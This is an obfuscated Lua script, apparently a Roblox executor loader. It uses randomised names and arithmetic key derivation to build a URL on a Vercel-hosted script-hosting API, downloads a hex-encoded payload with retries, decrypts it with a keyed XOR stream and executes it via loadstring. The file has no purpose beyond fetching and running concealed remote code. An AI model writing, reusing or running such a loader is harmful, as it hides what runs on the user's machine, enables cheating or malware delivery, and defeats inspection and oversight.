local wndmqq=bit32 or bit
local yy1k,ljz_jh,oep,sl0
if wndmqq then yy1k,ljz_jh,oep,sl0=wndmqq.bxor,wndmqq.lshift,wndmqq.rshift,wndmqq.band
else
local function ykw(zwin3b) return zwin3b%4294967296 end
yy1k=function(zwin3b,qjsdvk) local qaz,ip8=0,1 for esh6=1,32 do local axkqa,smaczy=zwin3b%2,qjsdvk%2 if axkqa~=smaczy then qaz=qaz+ip8 end zwin3b=(zwin3b-axkqa)/2 qjsdvk=(qjsdvk-smaczy)/2 ip8=ip8*2 end return qaz end
ljz_jh=function(zwin3b,qjsdvk) return ykw(zwin3b*2^qjsdvk) end
oep=function(zwin3b,qjsdvk) return math.floor(ykw(zwin3b)/2^qjsdvk) end
sl0=function(zwin3b,qjsdvk) local qaz,ip8=0,1 for esh6=1,32 do local axkqa,smaczy=zwin3b%2,qjsdvk%2 if axkqa==1 and smaczy==1 then qaz=qaz+ip8 end zwin3b=(zwin3b-axkqa)/2 qjsdvk=(qjsdvk-smaczy)/2 ip8=ip8*2 end return qaz end
end
local function rxf(zwin3b) if zwin3b==0 then zwin3b=2654435769 end zwin3b=yy1k(zwin3b,ljz_jh(zwin3b,13)) zwin3b=yy1k(zwin3b,oep(zwin3b,17)) zwin3b=yy1k(zwin3b,ljz_jh(zwin3b,5)) return zwin3b end
local u__="1791d7".."2fa1bf".."ef6".."f9302".."422f78c".."dcd8a"
local cdq=tonumber(u__:sub(1,8),16)
local px938=tonumber(u__:sub(9,16),16)
if cdq==0 then cdq=2654435769 end
if px938==0 then px938=2242054355 end
local u_i3=668265261
cdq=(ljz_jh(cdq,23)+oep(cdq,9))%4294967296
cdq=(cdq+(98160859+1338909334))%4294967296
cdq=(ljz_jh(cdq,22)+oep(cdq,10))%4294967296
cdq=yy1k(cdq,(1344164822+216701848))
cdq=(cdq*55129)%4294967296
u_i3=(u_i3*3+(28324659+27699334))%4294967296
cdq=(cdq*8453)%4294967296
cdq=(cdq+4174396074)%4294967296
px938=yy1k(px938,4174396074)
cdq=yy1k(cdq,u__:byte(12))
cdq=(ljz_jh(cdq,9)+oep(cdq,23))%4294967296
cdq=(ljz_jh(cdq,16)+oep(cdq,16))%4294967296
cdq=(cdq+2215633856)%4294967296
px938=yy1k(px938,(116369952+2099263904))
cdq=(cdq+px938)%4294967296
px938=yy1k(px938,cdq)
cdq=rxf(cdq)
px938=rxf(px938)
cdq=rxf(cdq)
px938=rxf(px938)
cdq=yy1k(cdq,u__:byte(3))
cdq=(ljz_jh(cdq,10)+oep(cdq,22))%4294967296
cdq=(ljz_jh(cdq,2)+oep(cdq,30))%4294967296
cdq=rxf(cdq)
px938=rxf(px938)
cdq=(cdq+1000071496)%4294967296
px938=yy1k(px938,1000071496)
cdq=(cdq+(161431815+538119559))%4294967296
px938=yy1k(px938,699551374)
local b5c0nl=string.format("%08x",cdq)..string.format("%08x",px938)
local y4u="https://lua-script-hosting-api.vercel.app/api/load/".."508c34".."ce3".."67c3f3".."cb01b".."e2401ef".."30c8da32".."d1a78588".."26b13e".."f2bac69".."0ee47".."da0"
y4u=y4u.."?n=".."e33b".."356".."725".."ca863f9c".."29f160".."d20f".."ac21721".."214".."1c2".."4ce8fa9".."&p="..b5c0nl
local jiqsv
for esh6=1,3 do
local oap,r3q=pcall(function() return game:HttpGet(y4u) end)
if oap and type(r3q)=="string" and #r3q>=2 then jiqsv=r3q break end
if esh6<3 then local gxrzgd=(task and task.wait) or wait if gxrzgd then pcall(gxrzgd,1) end end
end
if not jiqsv then return end
local p1vo4=cdq
local dxy=px938
if p1vo4==0 then p1vo4=2654435769 end
if dxy==0 then dxy=2242054355 end
local eih7ea,eja={},{}
for zz4 in jiqsv:gmatch("%x%x") do
p1vo4=rxf(p1vo4)
dxy=(dxy+2654435769)%4294967296
local xpmz=sl0(yy1k(p1vo4,oep(dxy,11)),255)
eih7ea[#eih7ea+1]=string.char(yy1k(tonumber(zz4,16),xpmz))
if #eih7ea>=4096 then eja[#eja+1]=table.concat(eih7ea) eih7ea={} end
end
if #eja==0 and #eih7ea==0 then return end
if #eih7ea>0 then eja[#eja+1]=table.concat(eih7ea) end
local boa=loadstring(table.concat(eja))
if boa then return boa() end